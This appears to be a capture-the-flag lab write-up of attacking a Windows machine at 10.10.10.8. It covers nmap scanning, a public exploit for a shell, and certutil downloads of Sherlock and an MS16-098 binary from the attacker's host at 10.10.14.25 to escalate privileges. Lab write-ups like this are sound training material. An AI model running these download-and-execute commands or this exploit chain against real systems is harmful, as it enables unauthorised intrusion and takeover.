# Enumeration
- We use `nmap -p- -A -Pn 10.10.10.8` to enumerate:![](attachment/ec15bca60a15214ce84e25bfdf5cb9c2.png)
- We found a website:![](attachment/b646d9528764eb0025f41cde0f628982.png)
# Exploitation
- We used the exploit https://www.exploit-db.com/exploits/39161 we need nc.exe ![](attachment/ec4b94d7a5013d5fbbbda03f1afd6b1b.png)
- we can find it in /usr/share/windows-resources/binaries/nc.exe and paste it into our Downloads/optimum folder
- We modify the ip in the exploit file![](attachment/5cd09758f6fdba139deca9a91f0ba02f.png)
- `python3 -m http.server 80` and host our current directory for the nc.exe file
- We keep running the exploit with `python 39161.py 10.10.10.8 80` to get the shell:![](attachment/17bf9c07ceb34a265c0248fb49202463.png)
- Then we upload sherlock(https://github.com/rasta-mouse/Sherlock) using `certutil -urlcache -f http://10.10.14.25/sherlock.ps1 sherlock.ps1` 
- Then use it to look for vulnerabilites using: `powershell.exe -exec bypass -Command "& {Import-Module .\sherlock.ps1; Find-AllVulns}"` : ![](attachment/fdac778fe513d4cdf0126d260eb1ac11.png)
- We can also use wesng(https://github.com/bitsadmin/wesng)
- We use https://github.com/sensepost/ms16-098/blob/master/bfill.exe to get privilege escalation by uploading the file first `certutil -urlcache -f http://10.10.14.25/bfill.exe bfill.exe` and then executing it `bfill.exe`:![](attachment/e7f399854085fbe8802369fbcf4a0098.png) We get a root shell.